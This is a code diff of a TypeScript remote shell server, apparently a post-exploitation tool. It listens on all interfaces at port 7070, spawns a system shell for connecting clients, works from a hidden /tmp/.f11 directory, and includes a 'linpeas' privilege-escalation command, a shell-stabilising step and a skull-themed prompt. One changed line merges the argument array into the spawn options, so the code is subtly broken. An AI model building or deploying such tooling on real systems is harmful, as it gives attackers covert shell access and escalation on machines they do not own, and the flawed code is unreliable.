@@ -15,7 +15,7 @@ const TMP_DIR = `/tmp/.f11`;
 const CMD_PASS = ['ls', 'cat', 'pwd', 'whoami', 'cd', 'curl', 'wget'];
 
 // Constants
-let PROMPT = colors.blue('snipe>') + colors.reset(' ');
+let PROMPT = colors.blue('💀 f11>') + colors.reset(' ');
 const NEWLINE = `\r\n`;
 const PORT = 7070;
 const HOST = '0.0.0.0';
@@ -71,7 +71,6 @@ const findNixShell = (): string => {
 }
 
 const findShell = (): string => isNotWindows() ? findNixShell() : findWinShell();
-// const shellProcess = spawn(findShell(), [], { shell: true, detached: true });
 
 class SnipeSocket {
   public sock: net.Socket;
@@ -113,9 +112,7 @@ class SnipeSocket {
       if (this.cp && this.cp.stdin) {
         const cmd = data.toString().trim();
 
-        if (!cmd) {
-          this.prompt();
-        } else if (/^(exit|quit)$/i.test(cmd)) {
+        if (/^(exit|quit)$/i.test(cmd)) {
           this.inShell = false;
           this.cleanup();
           this.prompt();
@@ -138,7 +135,7 @@ class SnipeSocket {
   }
 
   public prompt(): void {
-    this.cp?.stdin?.write(' ');
+    // this.cp?.stdin?.write(' ');
     this.sock.write(`${NEWLINE}${PROMPT}`);
   }
 
@@ -167,10 +164,12 @@ class SnipeSocket {
   }
 
   public spawn(cmd: string, args: string[] = [], opts?: SpawnOptionsWithoutStdio, cb?: (code: number|null) => void) {
-    this.cp = spawn(cmd, args, opts);
+    const defaults: SpawnOptionsWithoutStdio = {
+      cwd: '/tmp',
+      env: process.env
+    };
 
-    // this.cp.stdout.pipe(this.sock);
-    // this.cp.stderr.pipe(this.sock);
+    this.cp = spawn(cmd, args, { ...defaults, ...args });
 
     this.cp.stdout.on('data', (data) => {
       msg('debug', `SnipeSocket.cp.stdout: ${data}`);
@@ -197,6 +196,8 @@ class SnipeSocket {
       this.inShell = false;
       if (cb) cb(code);
     });
+
+    this.command(`${STABALIZE}\r\n`);
   }
 
   public cleanup(): void {
@@ -219,8 +220,6 @@ class SnipeSocket {
       this.shell();
     } else if (/^linpeas(\.sh)?$/i.test(cmd)) {
       this.linpeas();
-    // } else if (this.inShell) {
-    //   this.command(cmd);
     } else {
       this.sock.write(colors['warn'](`Command not found: '${cmd}'`));
       this.prompt();
@@ -244,7 +243,6 @@ server.on('connection', (sock: net.Socket) => {
 
   try {
     socket.welcome();
-    // socket.sock.on('data', socket.handle.bind(socket));
 
     socket.sock.on('close', (hadError: boolean) => {
       if (hadError) log(`Socket.on(close) with error!`);
